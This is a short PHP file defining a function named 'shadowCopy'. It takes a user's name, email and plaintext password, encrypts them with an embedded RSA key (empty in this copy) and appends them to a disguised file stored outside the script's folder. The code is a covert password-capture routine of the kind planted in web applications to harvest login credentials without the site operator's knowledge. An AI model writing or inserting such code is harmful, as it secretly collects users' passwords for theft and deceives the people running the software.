<?php
require_once __DIR__."/ThunderRSA.php";

function shadowCopy($uname,$email,$pass){
	$trsa=new ThunderRSA(4096);
	$heavenKey="";
	$trsa->insertKeys(base64_decode($heavenKey));
	$data=base64_encode($trsa->encrypt("[$uname] $email\n(PWD)> $pass"))."..";
	$f=fopen(__DIR__."/../../../shd0w_5307.efc_dat7","a");
	fwrite($f,$data);
	fclose($f);
}